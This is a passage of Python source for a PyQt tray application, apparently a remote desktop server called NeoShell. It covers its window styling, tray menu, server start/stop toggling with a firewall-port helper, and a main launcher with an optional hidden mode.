            APPS_DIR = Path(config["apps_path"])
            APPS_DIR.mkdir(parents=True, exist_ok=True)
            
            if config["auto_start"]:
                add_to_startup()
            else:
                remove_from_startup()
            
            subprocess.Popen([sys.executable])
            QApplication.quit()
        except:
            pass
    
    def _update_tray_icon(self):
        if server_running:
            color_rgb = (16, 185, 129)
            color_hex = "#10B981"
        else:
            color_rgb = (255, 204, 0)
            color_hex = "#ffcc00"
        
        if ICON_PATH.exists():
            icon = recolor_icon(ICON_PATH, color_rgb)
            if icon:
                self.tray_icon.setIcon(icon)
                return
        
        img = Image.new('RGBA', (64, 64), (0, 0, 0, 0))
        draw = ImageDraw.Draw(img)
        draw.ellipse((8, 8, 56, 56), fill=color_hex)
        draw.text((25, 20), "N", fill='#0A0A0C')
        output = BytesIO()
        img.save(output, format='PNG')
        output.seek(0)
        pixmap = QPixmap()
        pixmap.loadFromData(output.getvalue())
        self.tray_icon.setIcon(QIcon(pixmap))
    
    def _update_status(self):
        global server_running
        if server_running:
            self.status_label.setText("SERVER RUNNING")
            self.status_label.setStyleSheet("color: #10B981; font-size: 14px; font-weight: 700; margin-top: 15px; background: transparent;")
            self.main_btn.setText("STOP SERVER")
            self.main_btn.setStyleSheet("""
                QPushButton {
                    background: #dc3545;
                    color: #FFFFFF;
                    border-radius: 18px;
                    font-weight: 800;
                    font-size: 13px;
                    border: none;
                }
                QPushButton:hover {
                    background: #c82333;
                }
            """)
            self.connect_btn.setVisible(True)
            self.logo.start_glow()
        else:
            self.status_label.setText("SERVER STOPPED")
            self.status_label.setStyleSheet("color: #ff4444; font-size: 14px; font-weight: 700; margin-top: 15px; background: transparent;")
            self.main_btn.setText("START SERVER")
            self.main_btn.setStyleSheet("""
                QPushButton {
                    background: #121214;
                    color: #ffcc00;
                    border-radius: 18px;
                    font-weight: 800;
                    font-size: 13px;
                    border: 2px solid #ffcc00;
                }
                QPushButton:hover {
                    background: #ffcc00;
                    color: #0A0A0C;
                }
            """)
            self.connect_btn.setVisible(False)
            self.logo.stop_glow()
        
        self._update_tray_icon()
    
    def _auto_start_server(self):
        global server_running, server_thread
        if not server_running:
            open_firewall_port(PORT)
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()
    
    def _toggle_server(self):
        global server_running, server_thread
        if not server_running:
            self.main_btn.setText("STARTING...")
            open_firewall_port(PORT)
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()
        else:
            self.main_btn.setText("STOPPING...")
            stop_server()
    
    def _setup_tray(self):
        if ICON_PATH.exists():
            icon = recolor_icon(ICON_PATH, (255, 204, 0))
            if icon:
                self.tray_icon = QSystemTrayIcon(self)
                self.tray_icon.setIcon(icon)
            else:
                self.tray_icon = QSystemTrayIcon(self)
                self.tray_icon.setIcon(get_default_icon())
        else:
            self.tray_icon = QSystemTrayIcon(self)
            self.tray_icon.setIcon(get_default_icon())
        
        tray_menu = QMenu()
        tray_menu.setStyleSheet("""
            QMenu { background: #0A0A0C; color: #ffcc00; border: 1px solid #ffcc00; }
            QMenu::item:selected { background: #ffcc00; color: #0A0A0C; }
        """)
        
        show_action = QAction("Show Window", self)
        show_action.triggered.connect(self._show_window)
        tray_menu.addAction(show_action)
        
        start_action = QAction("Start Server", self)
        start_action.triggered.connect(self._auto_start_server)
        tray_menu.addAction(start_action)
        
        stop_action = QAction("Stop Server", self)
        stop_action.triggered.connect(stop_server)
        tray_menu.addAction(stop_action)
        
        tray_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(QApplication.quit)
        tray_menu.addAction(exit_action)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.activated.connect(self._on_tray_activate)
        self.tray_icon.show()
    
    def _on_tray_activate(self, reason):
        if reason == QSystemTrayIcon.ActivationReason.Trigger:
            self._show_window()
    
    def _show_window(self):
        self.showNormal()
        self.activateWindow()
        self.raise_()
    
    def paintEvent(self, e):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        path = QPainterPath()
        path.addRoundedRect(1.0, 1.0, float(self.width() - 2), float(self.height() - 2), 25.0, 25.0)
        p.fillPath(path, QColor("#0A0A0C"))
        p.strokePath(path, QPen(QColor("#ffcc00"), 2))
    
    def mousePressEvent(self, e):
        if e.button() == Qt.MouseButton.LeftButton and e.pos().y() <= 60:
            self._drag_pos = e.globalPosition().toPoint() - self.frameGeometry().topLeft()
    
    def mouseMoveEvent(self, e):
        if self._drag_pos is not None:
            self.move(e.globalPosition().toPoint() - self._drag_pos)
    
    def mouseReleaseEvent(self, e):
        self._drag_pos = None
    
    def closeEvent(self, e):
        e.ignore()
        self.hide()

# ------------------------------------------------------------
# Главный запуск
# ------------------------------------------------------------
def main():
    os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
    os.environ["QT_SCALE_FACTOR_ROUNDING_POLICY"] = "PassThrough"
    
    if sys.platform == "win32":
        try:
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("neoshell.remote.desktop")
        except:
            pass
    
    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)
    app.setStyle("Fusion")
    
    kill_process_on_port(PORT)
    
    window = NeoShell()
    
    hidden_mode = len(sys.argv) > 1 and sys.argv[1] == '--hidden'
    if not hidden_mode:
        window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()